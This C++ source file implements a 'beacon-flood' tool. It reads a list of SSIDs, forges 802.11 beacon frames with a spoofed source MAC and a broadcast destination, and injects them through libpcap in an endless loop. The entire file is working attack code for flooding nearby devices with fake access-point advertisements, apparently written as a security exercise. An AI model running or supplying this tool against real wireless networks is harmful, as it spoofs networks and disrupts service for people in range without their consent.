#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <string.h>
#include <list>
#include <string>
#include "beacon-flood.h"

using namespace std;

list<string> ssid_list;

void usage()
{
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

int readSsidList(char *ssid_list_file)
{
    FILE *f = fopen(ssid_list_file, "rt");

    if (f == NULL)
    {
        fprintf(stderr, "couldn't open file %s\n", ssid_list_file);
        return -1;
    }

    char ssid[256] = "";

    while (fgets(ssid, 256, f) != NULL)
    {
        // printf("%s", ssid);
        ssid[strcspn(ssid, "\n")] = '\0';
        ssid_list.push_back(ssid);
    }

    fclose(f);

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    if (readSsidList(argv[2]) == -1)
    {
        return -1;
    }

    list<string>::iterator it = ssid_list.begin();

    while (true)
    {
        int packet_size = sizeof(BeaconPkt) - 40 + it->length() + 5;
        struct BeaconPkt *packet = (BeaconPkt *)malloc(packet_size);

        packet->radiotaphdr.revision = NON;
        packet->radiotaphdr.pad = NON;
        packet->radiotaphdr.length = 0x0008;
        packet->radiotaphdr.present_flags = NON;

        packet->beaconframe.frame_control = 0x0080;
        packet->beaconframe.duration = NON;
        packet->beaconframe.dmac = Mac("ff:ff:ff:ff:ff:ff");
        packet->beaconframe.smac = Mac("00:11:22:33:44:55");
        packet->beaconframe.bss_id = Mac("00:00:00:00:00:00");
        packet->beaconframe.sequence = NON;

        packet->wirelessmanagement.timestamp = NON;
        packet->wirelessmanagement.interval = NON;
        packet->wirelessmanagement.capabilities = NON;
        packet->wirelessmanagement.tag_number = NON;
        packet->wirelessmanagement.tag_length = it->size();
        memcpy(&packet->wirelessmanagement.ssid[0], it->c_str(), it->size());
        memset(&packet->wirelessmanagement.ssid[0] + it->size(), 0x01, 1);
        memset(&packet->wirelessmanagement.ssid[0] + it->size() + 1, 0x03, 1);
        memset(&packet->wirelessmanagement.ssid[0] + it->size() + 2, 0x82, 1);
        memset(&packet->wirelessmanagement.ssid[0] + it->size() + 3, 0x8b, 1);
        memset(&packet->wirelessmanagement.ssid[0] + it->size() + 4, 0x96, 1);

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(packet), packet_size);
        free(packet);
        if (res != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return -1;
        }

        usleep(10000);

        if (++it == ssid_list.end())
            it = ssid_list.begin();
    }

    pcap_close(handle);

    return 0;
}
